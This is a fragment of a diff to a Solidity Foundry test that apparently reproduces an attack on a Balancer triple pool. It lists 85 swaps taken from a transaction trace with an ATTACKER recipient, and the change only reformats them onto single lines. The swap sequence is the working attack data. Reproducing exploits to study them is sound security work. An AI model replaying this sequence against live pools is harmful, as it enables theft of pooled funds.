@@ -109,775 +109,96 @@ contract BalancerTriplePoolTest is Test {
             fromInternalBalance: false,
             recipient: payable(ATTACKER),
             toInternalBalance: true
-        });
+       });
 
         // swaps from transaction trace
         ExactSwapData[85] memory swaps;
 
-        swaps[0] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 31487826131209268479,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[1] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 28452475255668423869,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[2] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 89053036336646360813,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[3] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 314878261312092685,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[4] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 284524752556684238,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[5] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 890530363366463608,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[6] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 3148782613120927,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[7] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 2845247525566843,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[8] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 8905303633664636,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[9] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 31487826131209,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[10] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 28452475255668,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[11] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 89053036336646,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[12] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 314878261312,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[13] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 284524752557,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[14] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 890530363367,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[15] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 3148782614,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[16] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 2845247526,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[17] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 8905303634,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[18] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 31487826,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[19] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 28452475,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[20] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 89053036,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[21] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 314878,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[22] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 284525,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[23] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 890530,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[24] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 3149,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[25] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 2845,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[26] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 8906,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[27] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: ezETH,
-            amount: 32,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 1
-        });
-
-        swaps[28] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: weETH,
-            amount: 29,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 2
-        });
-
-        swaps[29] = ExactSwapData({
-            tokenIn: TRIPLE_BPT,
-            tokenOut: rswETH,
-            amount: 90,
-            expectedIn: 0,
-            indexIn: 0,
-            indexOut: 3
-        });
-
-        swaps[30] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 4999999984,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[31] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[32] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 18000000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[33] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 2692,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[34] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[35] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 13000000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[36] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 306830,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[37] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[38] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 9300000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[39] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 21054,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[40] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[41] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 6600000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[42] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 14075,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[43] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[44] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 4700000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[45] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 8182,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[46] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[47] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 3300000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[48] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 1828,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[49] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[50] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 2300000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[51] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 584,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[52] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[53] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 1700000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[54] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 370877,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[55] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[56] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 1200000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[57] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 233,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[58] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[59] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 910000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[60] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 1001851,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[61] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[62] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 810000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[63] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 13960,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[64] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[65] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 531000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[66] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 78,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[67] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[68] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 420000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[69] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 7176,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[70] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[71] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 300000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[72] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 18633,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[73] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: ezETH,
-            amount: 15,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 1
-        });
-
-        swaps[74] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: weETH,
-            amount: 210000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 2
-        });
-
-        swaps[75] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 0
-        });
-
-        swaps[76] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000000,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 0
-        });
-
-        swaps[77] = ExactSwapData({
-            tokenIn: rswETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000000000,
-            expectedIn: 0,
-            indexIn: 3,
-            indexOut: 0
-        });
-
-        swaps[78] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 0
-        });
-
-        swaps[79] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000000000000000,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 0
-        });
-
-        swaps[80] = ExactSwapData({
-            tokenIn: rswETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 10000000000000000000,
-            expectedIn: 0,
-            indexIn: 3,
-            indexOut: 0
-        });
-
-        swaps[81] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 47499890220466816244,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 0
-        });
-
-        swaps[82] = ExactSwapData({
-            tokenIn: weETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 47499890220466816244,
-            expectedIn: 0,
-            indexIn: 2,
-            indexOut: 0
-        });
-
-        swaps[83] = ExactSwapData({
-            tokenIn: rswETH,
-            tokenOut: TRIPLE_BPT,
-            amount: 47499890220466816244,
-            expectedIn: 0,
-            indexIn: 3,
-            indexOut: 0
-        });
-
-        swaps[84] = ExactSwapData({
-            tokenIn: ezETH,
-            tokenOut: rswETH,
-            amount: 41000000000000000000,
-            expectedIn: 0,
-            indexIn: 1,
-            indexOut: 3
-        });
+        swaps[0] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826131209268479, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[1] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475255668423869, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[2] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036336646360813, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[3] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878261312092685, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[4] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284524752556684238, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[5] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530363366463608, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[6] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3148782613120927, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[7] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845247525566843, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[8] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8905303633664636, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[9] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826131209, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[10] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475255668, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[11] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036336646, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[12] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878261312, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[13] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284524752557, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[14] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530363367, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[15] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3148782614, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[16] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845247526, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[17] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8905303634, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[18] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[19] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[20] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[21] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[22] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284525, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[23] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[24] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3149, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[25] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[26] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8906, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[27] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 32, expectedIn: 0, indexIn: 0, indexOut: 1});
+        swaps[28] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 29, expectedIn: 0, indexIn: 0, indexOut: 2});
+        swaps[29] = ExactSwapData({tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 90, expectedIn: 0, indexIn: 0, indexOut: 3});
+        swaps[30] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 4999999984, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[31] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[32] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 18000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[33] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 2692, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[34] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[35] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 13000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[36] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 306830, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[37] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[38] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 9300000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[39] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 21054, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[40] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[41] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 6600000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[42] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 14075, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[43] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[44] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 4700000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[45] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 8182, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[46] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[47] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 3300000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[48] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 1828, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[49] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[50] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 2300000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[51] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 584, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[52] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[53] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 1700000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[54] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 370877, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[55] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[56] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 1200000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[57] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 233, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[58] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[59] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 910000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[60] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 1001851, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[61] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[62] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 810000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[63] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 13960, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[64] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[65] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 531000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[66] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 78, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[67] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[68] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 420000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[69] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 7176, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[70] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[71] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 300000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[72] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 18633, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[73] = ExactSwapData({tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1});
+        swaps[74] = ExactSwapData({tokenIn: ezETH, tokenOut: weETH, amount: 210000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
+        swaps[75] = ExactSwapData({tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0});
+        swaps[76] = ExactSwapData({tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0});
+        swaps[77] = ExactSwapData({tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 10000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
+        swaps[78] = ExactSwapData({tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 0});
+        swaps[79] = ExactSwapData({tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0});
+        swaps[80] = ExactSwapData({tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
+        swaps[81] = ExactSwapData({tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 1, indexOut: 0});
+        swaps[82] = ExactSwapData({tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 2, indexOut: 0});
+        swaps[83] = ExactSwapData({tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 3, indexOut: 0});
+        swaps[84] = ExactSwapData({tokenIn: ezETH, tokenOut: rswETH, amount: 41000000000000000000, expectedIn: 0, indexIn: 1, indexOut: 3});
 
 
         console.log("Executing swaps...");
@@ -891,7 +212,7 @@ contract BalancerTriplePoolTest is Test {
                 assetOut: IAsset(swaps[i].tokenOut),
                 amount: swaps[i].amount,
